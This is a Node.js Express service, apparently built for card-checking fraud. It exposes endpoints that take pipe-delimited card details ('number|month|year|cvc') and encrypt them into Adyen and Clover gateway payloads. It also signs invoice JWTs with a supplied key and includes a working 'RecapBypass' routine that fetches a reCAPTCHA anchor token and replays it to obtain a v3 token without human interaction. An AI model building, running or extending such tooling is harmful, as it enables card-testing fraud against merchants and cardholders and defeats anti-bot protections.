const express = require('express');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post('/adyenEncrypt', function (req, res) {
  try {
    const data = req.body;
    const version = data.version;
    const card = data.card;
    const encryptionKey = data.encryptionKey;
    const [cardNumber, expiryMonth, expiryYear, cvc] = card.split("|");
    const generationtime = new Date().toISOString();

    const adyenEncrypt = require('node-adyen-encrypt')(version);
    const adyenKey = encryptionKey;

    const options = {};

    const cardData = {
      number: cardNumber,
      generationtime: generationtime
    };

    const cardData1 = {
      expiryMonth: expiryMonth,
      generationtime: generationtime
    };

    const cardData2 = {
      expiryYear: expiryYear,
      generationtime: generationtime
    };

    const cardData3 = {
      cvc: cvc,
      generationtime: generationtime
    };

    const cseInstance = adyenEncrypt.createEncryption(adyenKey, options);

    const encryptedCardNumber = cseInstance.encrypt(cardData);
    const encryptedExpiryMonth = cseInstance.encrypt(cardData1);
    const encryptedExpiryYear = cseInstance.encrypt(cardData2);
    const encryptedSecurityCode = cseInstance.encrypt(cardData3);

    res.json({
      'encryptedCardNumber': encryptedCardNumber,
      'encryptedExpiryMonth': encryptedExpiryMonth,
      'encryptedExpiryYear': encryptedExpiryYear,
      'encryptedSecurityCode': encryptedSecurityCode,
      'Encrypted By': '@RailgunMisaka'
    });
  } catch (error) {
    res.status(500).json({ error: 'An error occurred during encryption.' });
  }
});

app.post('/adyenSingleEncryption', function (req, res) {
  try {
    const data = req.body;
    const version = data.version;
    const card = data.card;
    const encryptionKey = data.encryptionKey;
    const [number, expiryMonth, expiryYear, cvc] = card.split("|");
    const generationtime = new Date().toISOString();

    function addSpacesToCardNumber(number) {
      const cardNumberWithoutSpaces = number.replace(/\s/g, '');
      const cardNumber = cardNumberWithoutSpaces.replace(/(.{4})/g, '$1 ');
      return cardNumber.trim();
    }

    const cardNumber = addSpacesToCardNumber(number);
    const adyenEncrypt = require('node-adyen-encrypt')(version);
    const adyenKey = encryptionKey;

    const options = {};

    const cardData = {
      number : cardNumber,
      cvc : cvc,
      expiryMonth : expiryMonth,
      expiryYear : expiryYear,
      generationtime : generationtime
    };

    const cseInstance = adyenEncrypt.createEncryption(adyenKey, options);
    const encryptedData = cseInstance.encrypt(cardData);

    res.json({
      'encryptedData': encryptedData,
      'Encrypted By': '@RailgunMisaka'
    });
  } catch (error) {
    res.status(500).json({ error: 'An error occurred during encryption.' });
  }
});

app.post('/jwtGenerator', function (req, res) {
  try {
    const data = req.body;
    const signingKey = data.signingKey;
    const invoice = data.invoice;

    const jwt = require('jsonwebtoken');

    function genJwt() {

        const header = {
            "alg": "HS256",
            "typ": "JWT"
        };

        const time = Math.floor(Date.now() / 1000);
        
        const payload = {
            'invoice_id': invoice,
            'iat': time,
            'exp': (time + 900)
        };

        const jwtToken = jwt.sign(payload, signingKey, { algorithm: 'HS256', header });

        return jwtToken;
    }

    const jwtToken = genJwt();

    res.json({
      'JWT': jwtToken,
      'Generator by': '@RailgunMisaka',
      'Credits to': '@dhdu283 (Chillz)'
    });
  } catch (error) {
    res.status(500).json({ error: 'An error occurred during generation.' });
  }
});

app.post('/v3', async function (req, res) {
  try {
    const data = req.body;
    const key = data.key;
    const siteKey = data.siteKey;
    const anchorUrl = data.anchorUrl;

    const axios = require('axios');
    const querystring = require('querystring');

    let gRecaptchaResponse;

    class RecapBypass {
      constructor(anchorUrl) {
        this.anchorUrl = anchorUrl;
      }

      xformParser(data) {
        const result = {};
        data.split('&').forEach(item => {
          const [key, value] = item.split('=');
          result[key] = decodeURIComponent(value);
        });
        return result;
      }

      async captchaBypass(siteKey = "defaultSiteKey") {
        try {
          const r1 = await axios.get(this.anchorUrl);
          const matches = r1.data.match(/id="recaptcha-token"\s*value="(.*?)"/);

          if (!matches) {
            return { error: "Parse Token Error" };
          }

          const anchorData = this.xformParser(this.anchorUrl.slice(this.anchorUrl.indexOf("/anchor?") + 8));

          const url = `https://www.google.com/recaptcha/api2/reload?k=${siteKey}`;

          const data = {
            ...anchorData,
            reason: "q",
            c: matches[1],
            chr: "",
            vh: "",
            bg: ""
          };

          const options = {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          };

          const response = await axios.post(url, querystring.stringify(data), options);

          const token = response.data.split('"rresp","')[1].split('"')[0];
          return { token };
        } catch (error) {
          return { error: "Error while parsing response" };
        }
      }
    }

    const recapBypass = new RecapBypass(anchorUrl);
    const recapResult = await recapBypass.captchaBypass(siteKey);

    gRecaptchaResponse = recapResult.token || null;

    res.json({
      'gRecaptchaResponse': gRecaptchaResponse,
      'Solver by': '@RailgunMisaka',
      'Credits to': '@dhdu283 (Chillz)'
    });
  } catch (error) {
    res.status(500).json({ error: 'An error occurred during process.' });
  }
});

app.post('/cloverEncrypt', function (req, res) {
  try {
    const data = req.body;
    const cardNumber = data.cardNumber;

    const NodeRSA = require('node-rsa');

    const rsaPublicKey = `-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArxHJAejXwDpyWwjsMzL7
    D1WJ/rDCaiqvsiiHZA+8nnVHVD65oWB9HH1O+ONuhhSblWBNKB0YWeA47cS0JisT
    izZAvXHfRNC2Sp9ZnSQvtA67GKPZsTsvOS2AlrExvYHc7ibwVVvLoz/ByJV/N7w5
    lBABmu57aFuIa4GEWPfb677dqnv695D1qlbJwTI+BjPk/OPHXuudYG1bi1uE7goq
    StX/fL6D0joXnzzMzs2ZdUKMAV/zC/kaILlAe5qA1q3aQQfd8h+gkYCskjfOrp38
    abNCe/DFXceq9qQ3R5YkviCxQAZJBZYzD1FjtTsOG7xIV4uoQLJjHzsJaQLkDdrw
    YwIDAQAB
    -----END PUBLIC KEY-----`;

    const key = new NodeRSA();
    key.importKey(rsaPublicKey, 'pkcs8-public-pem');

    const paddedCardNumber = '00000000' + cardNumber;
    const encrypted_pan = key.encrypt(paddedCardNumber, 'base64');

    res.json({
      'encrypted_pan': encrypted_pan,
      'Encrypted by': '@RailgunMisaka'
    });
  } catch (error) {
    res.status(500).json({ error: 'An error occurred during encryption.' });
  }
});

app.listen(port, () => {
  console.log(`Server is listening on port ${port}`);
});